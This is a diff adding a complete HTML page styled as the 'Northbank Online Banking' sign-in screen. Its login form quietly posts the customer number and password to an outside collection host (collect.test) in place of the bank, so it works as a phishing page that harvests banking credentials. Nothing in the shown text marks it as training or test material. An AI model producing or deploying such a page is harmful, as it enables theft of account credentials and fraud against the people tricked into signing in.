@@ -1,0 +1,25 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<title>Northbank Online Banking: Sign in</title>
+<style>
+  body { font-family: sans-serif; background: #eef2f5; margin: 0; }
+  header { background: #0b3d6b; color: #fff; padding: 18px 32px; font-size: 28px; font-weight: bold; }
+  main { max-width: 380px; margin: 60px auto; background: #fff; padding: 28px; border-radius: 8px; }
+  label, input, button { display: block; width: 100%; margin-top: 10px; font-size: 16px; }
+  button { background: #0b3d6b; color: #fff; border: 0; padding: 10px; margin-top: 18px; }
+</style>
+</head>
+<body>
+<header>Northbank</header>
+<main>
+  <h2>Sign in to Online Banking</h2>
+  <form action="https://collect.test/nb" method="post">
+    <label>Customer number <input name="customer"></label>
+    <label>Password <input type="password" name="pw"></label>
+    <button>Sign in</button>
+  </form>
+</main>
+</body>
+</html>
